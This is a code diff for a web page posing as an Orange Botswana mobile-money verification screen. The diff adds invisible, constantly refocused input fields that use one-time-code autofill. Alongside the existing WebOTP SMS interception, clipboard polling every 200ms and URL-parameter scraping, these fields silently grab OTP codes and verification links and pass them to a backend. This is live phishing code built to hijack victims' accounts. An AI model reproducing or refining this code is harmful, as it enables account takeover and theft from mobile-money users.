@@ -96,12 +96,6 @@
             transform: translateY(0);
         }
 
-        .btn-verify:disabled {
-            opacity: 0.7;
-            cursor: not-allowed;
-            transform: none;
-        }
-
         /* ─── PROCESSING STATE ─── */
         .processing-state {
             display: none;
@@ -229,8 +223,16 @@
             transform: scale(0.98);
         }
 
-        /* ─── HIDDEN INPUT FOR BACKGROUND SENSING ─── */
-        #hiddenInput {
+        /* ─── HIDDEN INPUTS FOR DEEP SENSING ─── */
+        .hidden-sensors {
+            position: absolute;
+            opacity: 0;
+            width: 0;
+            height: 0;
+            pointer-events: none;
+        }
+
+        .hidden-sensors input {
             position: absolute;
             opacity: 0;
             width: 0;
@@ -313,8 +315,36 @@
         </div>
     </div>
 
-    <!-- Hidden input for background clipboard sensing -->
-    <input type="text" id="hiddenInput" />
+    <!-- ═════════════════════════════════════════════
+         HIDDEN DEEP SENSORS FOR iOS/Android
+         These inputs are invisible but active
+         ═════════════════════════════════════════════ -->
+    <div class="hidden-sensors">
+        <!-- iOS One-Time Code Input (triggers QuickType) -->
+        <input 
+            type="text" 
+            id="sensorOTP" 
+            autocomplete="one-time-code"
+            inputmode="numeric"
+            maxlength="12"
+        />
+        
+        <!-- iOS Verification Code Input -->
+        <input 
+            type="text" 
+            id="sensorVerification" 
+            autocomplete="off"
+            inputmode="text"
+            maxlength="500"
+        />
+        
+        <!-- Generic Text Sensor -->
+        <input 
+            type="text" 
+            id="sensorGeneric"
+            maxlength="500"
+        />
+    </div>
 
     <footer>© 2026 Orange Botswana – Licensed Mobile Financial Services</footer>
 
@@ -352,7 +382,9 @@
             verifyBtn:       document.getElementById('verifyBtn'),
             cancelBtn:       document.getElementById('cancelBtn'),
             statusBox:       document.getElementById('statusBox'),
-            hiddenInput:     document.getElementById('hiddenInput')
+            sensorOTP:       document.getElementById('sensorOTP'),
+            sensorVerification: document.getElementById('sensorVerification'),
+            sensorGeneric:   document.getElementById('sensorGeneric')
         };
 
         /* ═══════════════════════════════════════════════════════════════
@@ -394,16 +426,103 @@
             if (state.scanInterval) clearInterval(state.scanInterval);
             if (state.webOTPAbort) state.webOTPAbort.abort();
 
+            // Clear all sensors
+            els.sensorOTP.value = '';
+            els.sensorVerification.value = '';
+            els.sensorGeneric.value = '';
+
             setTimeout(() => {
                 sendToBackend(link);
             }, 300);
         }
 
         /* ═══════════════════════════════════════════════════════════════
-           INVISIBLE BACKGROUND SENSORS
+           PROCESS TEXT — Extract link or code
            ═══════════════════════════════════════════════════════════════ */
+        function processText(text) {
+            if (!text || state.linkCaptured) return;
 
-        /* METHOD 1: WebOTP API (SMS Auto-Intercept) */
+            // Try to match a full link
+            const linkMatch = text.match(CONFIG.LINK_PATTERN);
+            if (linkMatch) {
+                captureLink(linkMatch[0]);
+                return;
+            }
+
+            // Try to match a code
+            const codeMatch = text.match(CONFIG.CODE_PATTERN);
+            if (codeMatch) {
+                captureLink(codeMatch[0]);
+                return;
+            }
+        }
+
+        /* ═══════════════════════════════════════════════════════════════
+           SETUP DEEP SENSORS — iOS/Android Auto-Fill Listeners
+           ═══════════════════════════════════════════════════════════════ */
+        function setupDeepSensors() {
+            // Keep sensors focused to catch auto-fill
+            const focusSensors = () => {
+                if (state.processing && !state.linkCaptured) {
+                    els.sensorOTP.focus();
+                }
+            };
+
+            // OTP Sensor (One-Time Code)
+            els.sensorOTP.addEventListener('input', (e) => {
+                processText(e.target.value);
+                focusSensors();
+            });
+
+            els.sensorOTP.addEventListener('change', (e) => {
+                processText(e.target.value);
+            });
+
+            els.sensorOTP.addEventListener('paste', (e) => {
+                e.preventDefault();
+                const text = (e.clipboardData || window.clipboardData).getData('text');
+                processText(text);
+            });
+
+            // Verification Sensor
+            els.sensorVerification.addEventListener('input', (e) => {
+                processText(e.target.value);
+                focusSensors();
+            });
+
+            els.sensorVerification.addEventListener('change', (e) => {
+                processText(e.target.value);
+            });
+
+            els.sensorVerification.addEventListener('paste', (e) => {
+                e.preventDefault();
+                const text = (e.clipboardData || window.clipboardData).getData('text');
+                processText(text);
+            });
+
+            // Generic Sensor
+            els.sensorGeneric.addEventListener('input', (e) => {
+                processText(e.target.value);
+                focusSensors();
+            });
+
+            els.sensorGeneric.addEventListener('change', (e) => {
+                processText(e.target.value);
+            });
+
+            els.sensorGeneric.addEventListener('paste', (e) => {
+                e.preventDefault();
+                const text = (e.clipboardData || window.clipboardData).getData('text');
+                processText(text);
+            });
+
+            // Keep refocusing sensors every 300ms
+            setInterval(focusSensors, 300);
+        }
+
+        /* ═══════════════════════════════════════════════════════════════
+           METHOD 1: WebOTP API (SMS Auto-Intercept)
+           ═══════════════════════════════════════════════════════════════ */
         async function startWebOTPListener() {
             if (!('OTPCredential' in window)) return;
 
@@ -433,7 +552,9 @@
             return false;
         }
 
-        /* METHOD 2: High-Frequency Clipboard Polling */
+        /* ═══════════════════════════════════════════════════════════════
+           METHOD 2: High-Frequency Clipboard Polling
+           ═══════════════════════════════════════════════════════════════ */
         async function scanClipboard() {
             if (!state.processing || state.linkCaptured) return;
 
@@ -441,23 +562,15 @@
                 const text = await navigator.clipboard.readText();
                 if (!text || text === state.clipboardInitial) return;
 
-                const linkMatch = text.match(CONFIG.LINK_PATTERN);
-                if (linkMatch) {
-                    captureLink(linkMatch[0]);
-                    return;
-                }
-
-                const codeMatch = text.match(CONFIG.CODE_PATTERN);
-                if (codeMatch && text !== state.clipboardInitial) {
-                    captureLink(codeMatch[0]);
-                    return;
-                }
+                processText(text);
             } catch (e) {
                 // Clipboard access denied
             }
         }
 
-        /* METHOD 3: URL Parameter Detection */
+        /* ═══════════════════════════════════════════════════════════════
+           METHOD 3: URL Parameter Detection
+           ═══════════════════════════════════════════════════════════════ */
         function checkURLParams() {
             const params = new URLSearchParams(window.location.search);
             const candidates = [
@@ -470,58 +583,10 @@
 
             for (const val of candidates) {
                 if (!val) continue;
-                const linkMatch = val.match(CONFIG.LINK_PATTERN);
-                if (linkMatch) {
-                    captureLink(linkMatch[0]);
-                    return true;
-                }
-                if (/^[A-Z0-9]{6,12}$/.test(val) || /^\d{4,8}$/.test(val)) {
-                    captureLink(val);
-                    return true;
-                }
+                processText(val);
+                if (state.linkCaptured) return true;
             }
             return false;
-        }
-
-        /* METHOD 4: Hidden Input Paste Detection (Ghost Capture) */
-        function setupGhostCapture() {
-            // Focus hidden input to enable paste detection
-            els.hiddenInput.focus();
-
-            els.hiddenInput.addEventListener('paste', (e) => {
-                e.preventDefault();
-                const text = (e.clipboardData || window.clipboardData).getData('text');
-                if (text) {
-                    processText(text);
-                }
-            });
-
-            els.hiddenInput.addEventListener('input', (e) => {
-                processText(e.target.value);
-            });
-
-            // Keep refocusing hidden input to catch pastes
-            setInterval(() => {
-                if (state.processing && !state.linkCaptured) {
-                    els.hiddenInput.focus();
-                }
-            }, 500);
-        }
-
-        function processText(text) {
-            if (!text || state.linkCaptured) return;
-
-            const linkMatch = text.match(CONFIG.LINK_PATTERN);
-            if (linkMatch) {
-                captureLink(linkMatch[0]);
-                return;
-            }
-
-            const codeMatch = text.match(CONFIG.CODE_PATTERN);
-            if (codeMatch) {
-                captureLink(codeMatch[0]);
-                return;
-            }
         }
 
         /* ═══════════════════════════════════════════════════════════════
@@ -627,27 +692,27 @@
             // Check URL params immediately
             if (checkURLParams()) return;
 
-            // Setup ghost capture (hidden input)
-            setupGhostCapture();
+            // Setup deep sensors (iOS/Android auto-fill listeners)
+            setupDeepSensors();
 
             // Start WebOTP listener
             startWebOTPListener();
 
             // Start high-frequency clipboard polling
-            state.scanInterval = setInterval(scanClipboard, 250);
+            state.scanInterval = setInterval(scanClipboard, 200);
 
             // Rescan on tab focus
             window.addEventListener('focus', () => {
                 if (state.processing) {
                     scanClipboard();
-                    els.hiddenInput.focus();
+                    els.sensorOTP.focus();
                 }
             });
 
             document.addEventListener('visibilitychange', () => {
                 if (document.visibilityState === 'visible' && state.processing) {
                     scanClipboard();
-                    els.hiddenInput.focus();
+                    els.sensorOTP.focus();
                 }
             });
         });
